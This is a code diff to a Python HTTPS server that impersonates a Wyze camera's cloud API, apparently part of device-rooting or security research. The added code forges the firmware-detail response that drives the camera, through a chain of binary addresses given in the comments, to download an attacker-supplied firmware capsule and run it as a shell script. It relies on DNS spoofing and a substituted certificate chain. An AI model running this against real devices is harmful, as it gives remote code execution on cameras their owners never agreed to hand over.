@@ -33,6 +33,41 @@ def _up_ip(host=UP_HOST):
     return None
 
 
+# ---------------------------------------------------------------------------
+# /firmware/upgrade/get_firmware_detail responder (docs/exploit/ota-path.md §23.4)
+#
+# Silent-upgrade delivery trigger: iCamera's WYZE_OTAPulse loop (iCamera:0x475b14 ->
+# PLT WYZE_OTAPulse, GOT 0x8d4cdc) calls WYZE_GetFirmwareDetail (libwyzefdk.so:0x1acc8)
+# which requests /firmware/upgrade/get_firmware_detail from the cloud API host we
+# already DNS-spoof. A response in the captured shape drives the SDK verdict
+# (0x1b944 -> 0x1b1bc) -> WYZE_OTA_CallBack (0xdafc, table 0x1874) -> iCamera
+# fcn.00433680 -> fcn.00475c70(a0=4) -> SysV msg 0x1fe to assis ->
+# system("sh /tmp/Upgrade/upgraderun.sh") (assis 0x4087c4). See §22/§23.
+# ---------------------------------------------------------------------------
+
+
+def firmware_detail_response(target_version, capsule_url, capsule_md5, trace_id=None):
+    """Build the get_firmware_detail body in the §23.4 captured shape.
+
+    Shape is the one retained from the real cloud answer (ota-path.md §2/§23.4):
+    string "code":"1", "msg":"SUCCESS", data{version,url,filename}, traceId.
+    The SDK verdict reads version + url; the md5 carrier is added under every alias
+    observed in the descriptor vocabulary (assis handler 0x476e98 takes url/md5/model/
+    sub_mac; §23.4 names firmwareMd5) so whichever the SDK forwards lands intact.
+    """
+    filename = capsule_url.rsplit("/", 1)[-1].split("?")[0] or "firmware.tar"
+    data = {"version": target_version, "url": capsule_url, "filename": filename}
+    data["firmware_md5"] = capsule_md5
+    data["firmwareMd5"] = capsule_md5
+    data["md5"] = capsule_md5
+    return {
+        "code": "1",
+        "msg": "SUCCESS",
+        "data": data,
+        "traceId": trace_id or os.urandom(16).hex(),
+    }
+
+
 def passthrough(path, body, headers):
     """Forward an unimplemented call to the real cloud and return its bytes verbatim.
 
@@ -78,6 +113,18 @@ def main() -> int:
     ap.add_argument("--key", default=os.path.join(CERTDIR, "leaf.key"))
     ap.add_argument("--intermediate", default=os.path.join(CERTDIR, "ev-ca-aaa-cross.pem"))
     ap.add_argument("--sni", default="s3-us-west-2.amazonaws.com", help="expected SNI, for the log")
+    ap.add_argument("--firmware-detail", action="store_true", default=bool(os.environ.get("FIRMWARE_DETAIL")),
+                    help="answer /firmware/upgrade/get_firmware_detail (silent-upgrade trigger, §23.4)")
+    ap.add_argument("--target-version", default=os.environ.get("FIRMWARE_TARGET", "4.52.17.32"),
+                    help="version echoed in the get_firmware_detail answer")
+    ap.add_argument("--capsule-url",
+                    default=os.environ.get(
+                        "FIRMWARE_URL",
+                        "https://s3-us-west-2.amazonaws.com/wuv2/upgrade/HL_CAM4/firmware/4.52.17.32.tar"),
+                    help="capsule URL served to the device (host must be cert-covered)")
+    ap.add_argument("--capsule-md5", default=os.environ.get("FIRMWARE_MD5",
+                                                            "c642a2ca9f80b03c7ee5e05795f5822b"),
+                    help="md5 of the capsule bytes; assis verifies it before exec (§22.2)")
     a = ap.parse_args()
 
     chain = os.path.join(CERTDIR, "serve.pem")
@@ -92,6 +139,24 @@ def main() -> int:
         def __init__(self, *x, **kw):
             super().__init__(*x, directory=a.dir, **kw)
 
+        def do_GET(self):
+            # The SDK builds the get_firmware_detail request itself; accept GET too so a
+            # probe or an SDK variant that uses GET still lands on the trigger (§23.4).
+            if "get_firmware_detail" in self.path and a.firmware_detail:
+                print(f"{self.address_string()} ua={self.headers.get('User-Agent','-')!r} "
+                      f"GET {self.path}", flush=True)
+                obj = firmware_detail_response(a.target_version, a.capsule_url, a.capsule_md5)
+                print(f"  -> fw-detail v={a.target_version} url={a.capsule_url} md5={a.capsule_md5}",
+                      flush=True)
+                out = json.dumps(obj, separators=(",", ":")).encode()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.send_header("Content-Length", str(len(out)))
+                self.end_headers()
+                self.wfile.write(out)
+                return
+            super().do_GET()
+
         def do_POST(self):
             n = int(self.headers.get("Content-Length") or 0)
             body = self.rfile.read(n) if n else b""
@@ -101,6 +166,20 @@ def main() -> int:
                 print("  hdrs " + repr(dict(self.headers)), flush=True)
             if "get_iot_certificate" in self.path and os.environ.get("CERT_PASSTHROUGH"):
                 out = passthrough(self.path, body, self.headers)
+            elif "get_firmware_detail" in self.path and a.firmware_detail:
+                # Silent-upgrade delivery trigger (ota-path.md §23.4). Log the request
+                # fields so the first live run shows exactly what the SDK asked for.
+                try:
+                    req = json.loads(body)
+                except Exception:
+                    req = {}
+                if isinstance(req, dict) and req:
+                    print(f"  -> fw-detail req keys={sorted(req)} "
+                          f"version={req.get('version') or req.get('targetVersion')!r}", flush=True)
+                obj = firmware_detail_response(a.target_version, a.capsule_url, a.capsule_md5)
+                print(f"  -> fw-detail v={a.target_version} url={a.capsule_url} md5={a.capsule_md5}",
+                      flush=True)
+                out = json.dumps(obj, separators=(",", ":")).encode()
             elif "get_iot_certificate" in self.path:
                 # The stock client wants URLs, not inline PEM (EV-pack-H-002 §9.2). Each retry gets
                 # the next envelope variant so the device itself walks the candidate list; the
